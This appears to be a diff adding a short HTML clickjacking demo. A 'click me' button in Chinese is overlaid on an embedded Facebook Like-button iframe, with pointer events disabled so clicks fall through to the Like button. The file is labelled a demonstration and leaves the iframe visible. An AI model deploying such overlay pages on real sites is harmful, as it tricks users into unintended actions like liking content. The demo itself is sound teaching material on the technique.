@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>clickjacking demo</title>
+    <style>
+      iframe {
+        position: relative;
+        width: 300px;
+        height: 400px;
+        z-index: 2;
+        opacity: 1;
+      }
+
+
+      #btn {
+        position: fixed;
+        top: 5px;
+        z-index: 3;
+        height: 40px;
+        pointer-events: none;
+      }
+
+
+    </style>
+
+  </head>
+  <body>
+    <button id="btn">點我點我</button>
+    <iframe src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Fplugins%2F&width=72&layout=button&action=like&size=large&share=false&height=65&appId" width="72" height="65" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share"></iframe>
+  </body>
+</html>
